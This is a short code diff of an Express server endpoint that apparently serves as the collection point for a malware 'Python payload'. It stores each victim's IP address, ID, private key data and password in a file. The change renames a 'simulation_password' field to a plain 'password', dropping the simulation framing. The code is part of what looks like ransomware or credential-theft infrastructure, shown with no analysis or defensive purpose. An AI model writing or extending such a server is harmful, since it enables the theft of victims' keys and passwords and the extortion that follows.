@@ -17,7 +17,7 @@ app.post('/password', (req, res) => {
     const victimIp = req.body.victim_ip; // Python payload: 'victim_ip'
     const victimId = req.body.victim_id // python payload: 'victim_id'
     const privateKeyData = req.body.private_key_data; // Python payload: 'private_key_data'
-    const simulationPassword = req.body.simulation_password; // Python payload: 'simulation_password'
+    const Password = req.body.password; // Python payload: 'password'
 
     if (!victimIp || !privateKeyData) {
         console.error("Invalid request: IP address or private key data is missing.");
@@ -37,7 +37,7 @@ app.post('/password', (req, res) => {
         const info = {
             victim_ip: victimIp,
             victim_Id: victimId,
-            simulation_password: simulationPassword,
+            password: Password,
             timestamp: new Date().toISOString()
         };
         fs.writeFile(infoFilename, JSON.stringify(info, null, 2), (err) => {
